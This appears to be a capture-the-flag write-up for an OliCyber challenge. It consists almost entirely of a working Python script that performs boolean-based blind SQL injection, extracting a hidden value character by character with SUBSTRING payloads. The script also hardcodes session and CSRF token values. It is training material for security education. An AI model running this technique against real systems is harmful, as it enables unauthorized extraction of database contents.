# URL
https://training.olicyber.it/challenges#challenge-358
# Concept
* Boolean-based, Blind SQL Injection
# Method of solve


```
import requests
import string

# Target URL and credentials
url = "http://web-17.challs.olicyber.it/api/blind"

# Create a session
session = requests.Session()

# Set the cookie for the session
session.cookies.set('session', 'eyJjc3JmX3Rva2VuIjoiODUzYTliNWFjNzQxYWQ1NjIyNTVlMWI5YzVkYmRiNDc1ZDdmZDFhZCJ9.aPBWww.hWMVhJDPcErek9MpRQzWq4fUxS8')

# Characters to test (all letters and numbers)
charset = string.ascii_letters + string.digits + string.punctuation

# Storage for the extracted flag
extracted_flag = ""

# Headers to indicate JSON content
headers = {
    "Content-Type": "application/json",
    "X-CSRFToken": "Ijg1M2E5YjVhYzc0MWFkNTYyMjU1ZTFiOWM1ZGJkYjQ3NWQ3ZmQxYWQi.aPBmPw.suA_sZijAq7cEYGD_oH8GguFGgg"
}

print("[*] Starting flag extraction...")

# We don't know the length of the flag, but it could be up to 99 characters here...
for position in range(1, 100):
    found_char = False

    for char in charset:
        # Craft the boolean-based injection payload
        payload = {
            "query":f"1' AND SUBSTRING((SELECT asecret FROM secret LIMIT 1),{position},1)=\'{char}\' -- -"
        }
#        print(payload)
        # Send the request
        response = session.post(url, json=payload, headers=headers)
        print(response.text)
        
        # Check if the character is correct (boolean response)
        if "Success" in response.text:
            extracted_flag += char
            print(f"[+] Found character {position}: {char} → Current: {extracted_flag}")
            found_char = True
            break
    
    # If we didn't find a character (shouldn't happen)
    if not found_char:
        print(f"\n[*] No match found at position {position}")
        print(f"[!] Extraction complete!")
        print(f"[!] Complete flag: {extracted_flag}")
        break

print(f"[!] Complete flag: {extracted_flag}")
```
